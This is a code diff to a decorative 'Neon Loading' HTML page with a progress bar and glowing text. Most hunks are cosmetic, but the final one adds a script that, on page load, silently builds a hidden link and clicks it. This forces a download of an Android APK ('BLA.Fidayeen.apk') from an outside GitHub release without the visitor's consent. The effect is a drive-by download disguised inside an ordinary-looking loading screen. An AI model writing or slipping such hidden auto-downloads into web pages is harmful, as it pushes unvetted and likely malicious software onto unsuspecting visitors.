@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Neon Loading</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap');
@@ -172,6 +172,7 @@
   </div>
 
   <script>
+    // Progress animation
     const progressBar = document.getElementById('progressBar');
     const progressPercent = document.getElementById('progressPercent');
     let progress = 0;
@@ -207,12 +208,24 @@
       }, 500 * index);
     });
 
+    // Glow pulsing
     setInterval(() => {
       const glowing = document.querySelectorAll('.glow');
       glowing.forEach(el => {
         el.style.textShadow = `0 0 ${5 + Math.random() * 5}px #00ff41`;
       });
     }, 300);
+
+    // 🔽 Trigger auto-download on page load
+    window.addEventListener('load', () => {
+      const link = document.createElement('a');
+      link.href = 'https://github.com/hooooxjuxrr/su/releases/download/sa/BLA.Fidayeen.apk';
+      link.download = '';
+      link.style.display = 'none';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    });
   </script>
 </body>
 </html>
